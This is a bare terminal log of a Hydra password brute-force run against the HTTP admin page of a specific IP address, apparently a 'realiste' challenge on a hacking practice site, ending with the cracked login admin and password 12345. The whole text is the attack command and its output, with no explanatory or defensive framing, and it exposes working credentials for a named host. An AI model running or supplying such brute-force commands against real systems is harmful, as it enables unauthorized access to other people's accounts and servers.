hydra -l admin -P 10000.txt -s 80 -f 212.129.38.224 http-get /realiste/ch3/admin/index.php
Hydra v9.4 (c) 2022 by van Hauser/THC & David Maciejak - Please do not use in military or secret service organizations, or for illegal purposes (this is non-binding, these *** ignore laws and ethics anyway).

Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2024-03-19 12:11:48
[DATA] max 16 tasks per 1 server, overall 16 tasks, 10000 login tries (l:1/p:10000), ~625 tries per task
[DATA] attacking http-get://212.129.38.224:80/realiste/ch3/admin/index.php
[80][http-get] host: 212.129.38.224   login: admin   password: 12345
[STATUS] attack finished for 212.129.38.224 (valid pair found)
1 of 1 target successfully completed, 1 valid password found
Hydra (https://github.com/vanhauser-thc/thc-hydra) finished at 2024-03-19 12:11:48
